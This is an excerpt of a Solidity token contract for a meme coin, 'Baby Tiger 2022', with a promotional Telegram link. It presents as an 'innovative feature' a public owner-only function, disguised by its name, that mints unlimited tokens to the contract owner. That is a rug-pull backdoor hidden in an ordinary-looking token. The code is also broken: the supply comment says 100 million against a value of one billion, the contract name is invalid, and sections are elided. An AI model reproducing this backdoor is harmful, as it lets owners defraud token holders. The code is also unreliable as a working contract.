...
//
// $BabyTiger2022 proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/Babytiger2022BSC
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Babytiger2022(uint256 amount) public onlyOwner {
 _Babytiger2022(msg.sender, amount);
    }
    ...
    function _Babytiger2022(address account, uint256 amount) internal virtual {
...
contract $BabyTiger2022 is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Baby Tiger 2022", "BABYTIGER2022") {
        _Babytiger2022(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}